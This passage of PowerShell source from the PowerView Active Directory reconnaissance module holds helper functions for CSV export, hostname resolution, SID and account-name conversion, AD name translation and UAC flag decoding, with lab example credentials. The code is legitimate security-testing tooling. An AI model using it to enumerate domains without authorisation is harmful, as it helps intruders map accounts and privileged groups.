        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]$Type = [int],

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]$Alias,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$Mandatory,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]$Position,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$HelpMessage,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$DontShow,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipeline,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipelineByPropertyName,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromRemainingArguments,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$ParameterSetName = '__AllParameterSets',

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowNull,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyString,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyCollection,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNull,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNullOrEmpty,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateCount,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateRange,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateLength,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$ValidatePattern,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$ValidateScript,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$ValidateSet,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
            }
            $true
        })]
        $Dictionary = $false,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$CreateVariables,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            # System.Management.Automation.PSBoundParametersDictionary is an internal sealed class,
            # so one can't use PowerShell's '-is' operator to validate type.
            if($_.GetType().Name -notmatch 'Dictionary') {
                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
            }
            $true
        })]
        $BoundParameters
    )

    Begin {
        $InternalDictionary = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $CommonParameters = (Get-Command _temp).Parameters.Keys
    }

    Process {
        if($CreateVariables) {
            $BoundKeys = $BoundParameters.Keys | Where-Object { $CommonParameters -notcontains $_ }
            ForEach($Parameter in $BoundKeys) {
                if ($Parameter) {
                    Set-Variable -Name $Parameter -Value $BoundParameters.$Parameter -Scope 1 -Force
                }
            }
        }
        else {
            $StaleKeys = @()
            $StaleKeys = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match '^Equals$') {
                                # If object has Equals, compare bound key and variable using it
                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                # If object doesn't has Equals (e.g. $null), fallback to the PowerShell's -ne operator
                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($StaleKeys) {
                $StaleKeys | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }

            # Since we rely solely on $PSBoundParameters, we don't have access to default values for unbound parameters
            $UnboundParameters = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        # Find parameters that are belong to the current parameter set
                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |
                                                # Find unbound parameters in the current parameter set
                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }

            # Even if parameter is not bound, corresponding variable is created with parameter's default value (if specified)
            $tmp = $null
            ForEach ($Parameter in $UnboundParameters) {
                $DefaultValue = Get-Variable -Name $Parameter -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($Parameter, [ref]$tmp) -and $DefaultValue) {
                    $PSBoundParameters.$Parameter = $DefaultValue
                }
            }

            if($Dictionary) {
                $DPDictionary = $Dictionary
            }
            else {
                $DPDictionary = $InternalDictionary
            }

            # Shortcut for getting local variables
            $GetVar = {Get-Variable -Name $_ -ValueOnly -Scope 0}

            # Strings to match attributes and validation arguments
            $AttributeRegex = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
            $ValidationRegex = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
            $AliasRegex = '^Alias$'
            $ParameterAttribute = New-Object -TypeName System.Management.Automation.ParameterAttribute

            switch -regex ($PSBoundParameters.Keys) {
                $AttributeRegex {
                    Try {
                        $ParameterAttribute.$_ = . $GetVar
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }

            if($DPDictionary.Keys -contains $Name) {
                $DPDictionary.$Name.Attributes.Add($ParameterAttribute)
            }
            else {
                $AttributeCollection = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $ValidationRegex {
                        Try {
                            $ParameterOptions = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterOptions)
                        }
                        Catch { $_ }
                        continue
                    }
                    $AliasRegex {
                        Try {
                            $ParameterAlias = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterAlias)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $AttributeCollection.Add($ParameterAttribute)
                $Parameter = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $AttributeCollection)
                $DPDictionary.Add($Name, $Parameter)
            }
        }
    }

    End {
        if(!$CreateVariables -and !$Dictionary) {
            $DPDictionary
        }
    }
}

function Export-PowerViewCSV {
<#
.SYNOPSIS

Converts objects into a series of comma-separated (CSV) strings and saves the
strings in a CSV file in a thread-safe manner.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This helper exports an -InputObject to a .csv in a thread-safe manner
using a mutex. This is so the various multi-threaded functions in
PowerView has a thread-safe way to export output to the same file.
Uses .NET IO.FileStream/IO.StreamWriter objects for speed.

Originally based on Dmitry Sotnikov's Export-CSV code: http://poshcode.org/1590

.PARAMETER InputObject

Specifies the objects to export as CSV strings.

.PARAMETER Path

Specifies the path to the CSV output file.

.PARAMETER Delimiter

Specifies a delimiter to separate the property values. The default is a comma (,)

.PARAMETER Append

Indicates that this cmdlet adds the CSV output to the end of the specified file.
Without this parameter, Export-PowerViewCSV replaces the file contents without warning.

.EXAMPLE

Get-DomainUser | Export-PowerViewCSV -Path "users.csv"

.EXAMPLE

Get-DomainUser | Export-PowerViewCSV -Path "users.csv" -Append -Delimiter '|'

.INPUTS

PSObject

Accepts one or more PSObjects on the pipeline.

.LINK

http://poshcode.org/1590
http://dmitrysotnikov.wordpress.com/2010/01/19/Export-Csv-append/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $InputObject,

        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $Delimiter = ',',

        [Switch]
        $Append
    )

    BEGIN {
        $OutputPath = [IO.Path]::GetFullPath($PSBoundParameters['Path'])
        $Exists = [System.IO.File]::Exists($OutputPath)

        # mutex so threaded code doesn't stomp on the output file
        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex'
        $Null = $Mutex.WaitOne()

        if ($PSBoundParameters['Append']) {
            $FileMode = [System.IO.FileMode]::Append
        }
        else {
            $FileMode = [System.IO.FileMode]::Create
            $Exists = $False
        }

        $CSVStream = New-Object IO.FileStream($OutputPath, $FileMode, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $CSVWriter = New-Object System.IO.StreamWriter($CSVStream)
        $CSVWriter.AutoFlush = $True
    }

    PROCESS {
        ForEach ($Entry in $InputObject) {
            $ObjectCSV = ConvertTo-Csv -InputObject $Entry -Delimiter $Delimiter -NoTypeInformation

            if (-not $Exists) {
                # output the object field names as well
                $ObjectCSV | ForEach-Object { $CSVWriter.WriteLine($_) }
                $Exists = $True
            }
            else {
                # only output object field data
                $ObjectCSV[1..($ObjectCSV.Length-1)] | ForEach-Object { $CSVWriter.WriteLine($_) }
            }
        }
    }

    END {
        $Mutex.ReleaseMutex()
        $CSVWriter.Dispose()
        $CSVStream.Dispose()
    }
}

function Resolve-IPAddress {
<#
.SYNOPSIS

Resolves a given hostename to its associated IPv4 address.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Resolves a given hostename to its associated IPv4 address using
[Net.Dns]::GetHostEntry(). If no hostname is provided, the default
is the IP address of the localhost.

.EXAMPLE

Resolve-IPAddress -ComputerName SERVER

.EXAMPLE

@("SERVER1", "SERVER2") | Resolve-IPAddress

.INPUTS

String

Accepts one or more IP address strings on the pipeline.

.OUTPUTS

System.Management.Automation.PSCustomObject

A custom PSObject with the ComputerName and IPAddress.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                @(([Net.Dns]::GetHostEntry($Computer)).AddressList) | ForEach-Object {
                    if ($_.AddressFamily -eq 'InterNetwork') {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'ComputerName' $Computer
                        $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                        $Out
                    }
                }
            }
            catch {
                Write-Verbose "[Resolve-IPAddress] Could not resolve $Computer to an IP Address."
            }
        }
    }
}

function ConvertTo-SID {
<#
.SYNOPSIS

Converts a given user/group name to a security identifier (SID).

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Convert-ADName, Get-DomainObject, Get-Domain  

.DESCRIPTION

Converts a "DOMAIN\username" syntax to a security identifier (SID)
using System.Security.Principal.NTAccount's translate function. If alternate
credentials are supplied, then Get-ADObject is used to try to map the name
to a security identifier.

.PARAMETER ObjectName

The user/group name to convert, can be 'user' or 'DOMAIN\user' format.

.PARAMETER Domain

Specifies the domain to use for the translation, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the translation.

.PARAMETER Credential

Specifies an alternate credential to use for the translation.

.EXAMPLE

ConvertTo-SID 'DEV\dfm'

.EXAMPLE

'DEV\dfm','DEV\krbtgt' | ConvertTo-SID

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
'TESTLAB\dfm' | ConvertTo-SID -Credential $Cred

.INPUTS

String

Accepts one or more username specification strings on the pipeline.

.OUTPUTS

String

A string representing the SID of the translated name.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        $ObjectName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $DomainSearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $DomainSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $DomainSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $DomainSearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        ForEach ($Object in $ObjectName) {
            $Object = $Object -Replace '/','\'

            if ($PSBoundParameters['Credential']) {
                $DN = Convert-ADName -Identity $Object -OutputType 'DN' @DomainSearcherArguments
                if ($DN) {
                    $UserDomain = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    $UserName = $DN.Split(',')[0].split('=')[1]

                    $DomainSearcherArguments['Identity'] = $UserName
                    $DomainSearcherArguments['Domain'] = $UserDomain
                    $DomainSearcherArguments['Properties'] = 'objectsid'
                    Get-DomainObject @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $Domain = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters['Domain']) {
                        $DomainSearcherArguments = @{}
                        $Domain = (Get-Domain @DomainSearcherArguments).Name
                    }

                    $Obj = (New-Object System.Security.Principal.NTAccount($Domain, $Object))
                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose "[ConvertTo-SID] Error converting $Domain\$Object : $_"
                }
            }
        }
    }
}

function ConvertFrom-SID {
<#
.SYNOPSIS

Converts a security identifier (SID) to a group/user name.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Convert-ADName  

.DESCRIPTION

Converts a security identifier string (SID) to a group/user name
using Convert-ADName.

.PARAMETER ObjectSid

Specifies one or more SIDs to convert.

.PARAMETER Domain

Specifies the domain to use for the translation, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the translation.

.PARAMETER Credential

Specifies an alternate credential to use for the translation.

.EXAMPLE

ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108

TESTLAB\harmj0y

.EXAMPLE

"S-1-5-21-890171859-3433809279-3366196753-1107", "S-1-5-21-890171859-3433809279-3366196753-1108", "S-1-5-32-562" | ConvertFrom-SID

TESTLAB\WINDOWS2$
TESTLAB\harmj0y
BUILTIN\Distributed COM Users

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm', $SecPassword)
ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108 -Credential $Cred

TESTLAB\harmj0y

.INPUTS

String

Accepts one or more SID strings on the pipeline.

.OUTPUTS

String

The converted DOMAIN\username.
#>

    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        $ObjectSid,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ADNameArguments = @{}
        if ($PSBoundParameters['Domain']) { $ADNameArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
    }

    PROCESS {
        ForEach ($TargetSid in $ObjectSid) {
            $TargetSid = $TargetSid.trim('*')
            try {
                # try to resolve any built-in SIDs first - https://support.microsoft.com/en-us/kb/243330
                Switch ($TargetSid) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
                    'S-1-5-7'       { 'Anonymous' }
                    'S-1-5-8'       { 'Proxy' }
                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                    Default {
                        Convert-ADName -Identity $TargetSid @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose "[ConvertFrom-SID] Error converting SID '$TargetSid' : $_"
            }
        }
    }
}

function Convert-ADName {
<#
.SYNOPSIS

Converts Active Directory object names between a variety of formats.

Author: Bill Stewart, Pasquale Lantella  
Modifications: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function is heavily based on Bill Stewart's code and Pasquale Lantella's code (in LINK)
and translates Active Directory names between various formats using the NameTranslate COM object.

.PARAMETER Identity

Specifies the Active Directory object name to translate, of the following form:

    DN                short for 'distinguished name'; e.g., 'CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com'
    Canonical         canonical name; e.g., 'fabrikam.com/Engineers/Phineas Flynn'
    NT4               domain\username; e.g., 'fabrikam\pflynn'
    Display           display name, e.g. 'pflynn'
    DomainSimple      simple domain name format, e.g. 'pflynn@fabrikam.com'
    EnterpriseSimple  simple enterprise name format, e.g. 'pflynn@fabrikam.com'
    GUID              GUID; e.g., '{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}'
    UPN               user principal name; e.g., 'pflynn@fabrikam.com'
    CanonicalEx       extended canonical name format
    SPN               service principal name format; e.g. 'HTTP/kairomac.contoso.com'
    SID               Security Identifier; e.g., 'S-1-5-21-12986231-600641547-709122288-57999'

.PARAMETER OutputType

Specifies the output name type you want to convert to, which must be one of the following:

    DN                short for 'distinguished name'; e.g., 'CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com'
    Canonical         canonical name; e.g., 'fabrikam.com/Engineers/Phineas Flynn'
    NT4               domain\username; e.g., 'fabrikam\pflynn'
    Display           display name, e.g. 'pflynn'
    DomainSimple      simple domain name format, e.g. 'pflynn@fabrikam.com'
    EnterpriseSimple  simple enterprise name format, e.g. 'pflynn@fabrikam.com'
    GUID              GUID; e.g., '{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}'
    UPN               user principal name; e.g., 'pflynn@fabrikam.com'
    CanonicalEx       extended canonical name format, e.g. 'fabrikam.com/Users/Phineas Flynn'
    SPN               service principal name format; e.g. 'HTTP/kairomac.contoso.com'

.PARAMETER Domain

Specifies the domain to use for the translation, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the translation.

.PARAMETER Credential

Specifies an alternate credential to use for the translation.

.EXAMPLE

Convert-ADName -Identity "TESTLAB\harmj0y"

harmj0y@testlab.local

.EXAMPLE

"TESTLAB\krbtgt", "CN=Administrator,CN=Users,DC=testlab,DC=local" | Convert-ADName -OutputType Canonical

testlab.local/Users/krbtgt
testlab.local/Users/Administrator

.EXAMPLE

Convert-ADName -OutputType dn -Identity 'TESTLAB\harmj0y' -Server PRIMARY.testlab.local

CN=harmj0y,CN=Users,DC=testlab,DC=local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm', $SecPassword)
'S-1-5-21-890171859-3433809279-3366196753-1108' | Convert-ADNAme -Credential $Cred

TESTLAB\harmj0y

.INPUTS

String

Accepts one or more objects name strings on the pipeline.

.OUTPUTS

String

Outputs a string representing the converted name.

.LINK

http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats
https://gallery.technet.microsoft.com/scriptcenter/Translating-Active-5c80dd67
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $Identity,

        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        $OutputType,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $NameTypes = @{
            'DN'                =   1  # CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com
            'Canonical'         =   2  # fabrikam.com/Engineers/Phineas Flynn
            'NT4'               =   3  # fabrikam\pflynn
            'Display'           =   4  # pflynn
            'DomainSimple'      =   5  # pflynn@fabrikam.com
            'EnterpriseSimple'  =   6  # pflynn@fabrikam.com
            'GUID'              =   7  # {95ee9fff-3436-11d1-b2b0-d15ae3ac8436}
            'Unknown'           =   8  # unknown type - let the server do translation
            'UPN'               =   9  # pflynn@fabrikam.com
            'CanonicalEx'       =   10 # fabrikam.com/Users/Phineas Flynn
            'SPN'               =   11 # HTTP/kairomac.contoso.com
            'SID'               =   12 # S-1-5-21-12986231-600641547-709122288-57999
        }

        # accessor functions from Bill Stewart to simplify calls to NameTranslate
        function Invoke-Method([__ComObject] $Object, [String] $Method, $Parameters) {
            $Output = $Null
            $Output = $Object.GetType().InvokeMember($Method, 'InvokeMethod', $NULL, $Object, $Parameters)
            Write-Output $Output
        }

        function Get-Property([__ComObject] $Object, [String] $Property) {
            $Object.GetType().InvokeMember($Property, 'GetProperty', $NULL, $Object, $NULL)
        }

        function Set-Property([__ComObject] $Object, [String] $Property, $Parameters) {
            [Void] $Object.GetType().InvokeMember($Property, 'SetProperty', $NULL, $Object, $Parameters)
        }

        # https://msdn.microsoft.com/en-us/library/aa772266%28v=vs.85%29.aspx
        if ($PSBoundParameters['Server']) {
            $ADSInitType = 2
            $InitName = $Server
        }
        elseif ($PSBoundParameters['Domain']) {
            $ADSInitType = 1
            $InitName = $Domain
        }
        elseif ($PSBoundParameters['Credential']) {
            $Cred = $Credential.GetNetworkCredential()
            $ADSInitType = 1
            $InitName = $Cred.Domain
        }
        else {
            # if no domain or server is specified, default to GC initialization
            $ADSInitType = 3
            $InitName = $Null
        }
    }

    PROCESS {
        ForEach ($TargetIdentity in $Identity) {
            if (-not $PSBoundParameters['OutputType']) {
                if ($TargetIdentity -match "^[A-Za-z]+\\[A-Za-z ]+") {
                    $ADSOutputType = $NameTypes['DomainSimple']
                }
                else {
                    $ADSOutputType = $NameTypes['NT4']
                }
            }
            else {
                $ADSOutputType = $NameTypes[$OutputType]
            }

            $Translate = New-Object -ComObject NameTranslate

            if ($PSBoundParameters['Credential']) {
                try {
                    $Cred = $Credential.GetNetworkCredential()

                    Invoke-Method $Translate 'InitEx' (
                        $ADSInitType,
                        $InitName,
                        $Cred.UserName,
                        $Cred.Domain,
                        $Cred.Password
                    )
                }
                catch {
                    Write-Verbose "[Convert-ADName] Error initializing translation for '$Identity' using alternate credentials : $_"
                }
            }
            else {
                try {
                    $Null = Invoke-Method $Translate 'Init' (
                        $ADSInitType,
                        $InitName
                    )
                }
                catch {
                    Write-Verbose "[Convert-ADName] Error initializing translation for '$Identity' : $_"
                }
            }

            # always chase all referrals
            Set-Property $Translate 'ChaseReferral' (0x60)

            try {
                # 8 = Unknown name type -> let the server do the work for us
                $Null = Invoke-Method $Translate 'Set' (8, $TargetIdentity)
                Invoke-Method $Translate 'Get' ($ADSOutputType)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}

function ConvertFrom-UACValue {
<#
.SYNOPSIS

Converts a UAC int value to human readable form.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function will take an integer that represents a User Account
Control (UAC) binary blob and will covert it to an ordered
dictionary with each bitwise value broken out. By default only values
set are displayed- the -ShowAll switch will display all values with
a + next to the ones set.

.PARAMETER Value

Specifies the integer UAC value to convert.

.PARAMETER ShowAll

Switch. Signals ConvertFrom-UACValue to display all UAC values, with a + indicating the value is currently set.

.EXAMPLE

ConvertFrom-UACValue -Value 66176

Name                           Value
----                           -----
ENCRYPTED_TEXT_PWD_ALLOWED     128
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

.EXAMPLE

Get-DomainUser harmj0y | ConvertFrom-UACValue

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

.EXAMPLE

Get-DomainUser harmj0y | ConvertFrom-UACValue -ShowAll

Name                           Value
----                           -----
SCRIPT                         1
ACCOUNTDISABLE                 2
HOMEDIR_REQUIRED               8
